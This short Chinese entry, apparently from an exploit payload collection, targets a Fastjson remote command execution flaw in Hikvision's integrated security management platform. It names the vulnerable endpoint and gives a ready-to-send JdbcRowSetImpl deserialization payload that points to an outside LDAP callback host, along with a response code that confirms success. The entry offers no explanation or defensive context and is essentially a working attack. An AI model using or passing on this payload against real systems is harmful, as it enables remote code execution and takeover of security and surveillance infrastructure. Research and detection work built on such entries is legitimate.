# HiKVISION综合安防管理平台远程命令执行漏洞Fastjson

海康 ｜ 命令执行 ｜ —
- **请求**：`POST /bic/ssoService/v1/applyCT HTTP/1.1`

**Payload**
```
{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://kjvqweuoav.dnstunnel.run","autoCommit":true},"hfe4zyyzldp":"="}
```
- **响应特征**：-1 "code": "0x00215000"